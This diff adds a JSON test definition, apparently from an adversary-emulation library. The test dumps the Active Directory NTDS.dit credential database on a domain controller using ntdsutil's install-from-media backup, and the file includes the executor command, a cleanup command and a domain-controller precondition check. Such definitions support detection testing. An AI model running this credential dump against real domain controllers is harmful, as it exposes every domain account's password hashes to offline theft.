@@ -1,0 +1,37 @@
+{
+    "name": "Dump Active Directory Database with NTDSUtil",
+    "description": "This test is intended to be run on a domain Controller.  The Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability uses the IFM or Install From Media backup functionality that allows Active Directory restoration or installation of subsequent domain controllers without the need of network-based replication.  Upon successful completion, you will find a copy of the ntds.dit file in the C:\\Windows\\Temp directory. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "mkdir #{output_folder}\nntdsutil \"ac i ntds\" \"ifm\" \"create full #{output_folder}\" q q\n",
+        "cleanup_command": "rmdir /q /s #{output_folder} >nul 2>&1\n",
+        "name": "command_prompt",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1003.003",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "NTDS",
+    "source": "ART",
+    "uuid": "2364e33d-ceab-4641-8468-bfb1d7cc2723",
+    "arguments": {
+        "output_folder": {
+            "description": "Path where resulting dump should be placed",
+            "type": "path",
+            "default": "C:\\Windows\\Temp\\ntds_T1003"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "Target must be a Domain Controller\n",
+            "prereq_command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT\n",
+            "get_prereq_command": "echo Sorry, Promoting this machine to a Domain Controller must be done manually\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
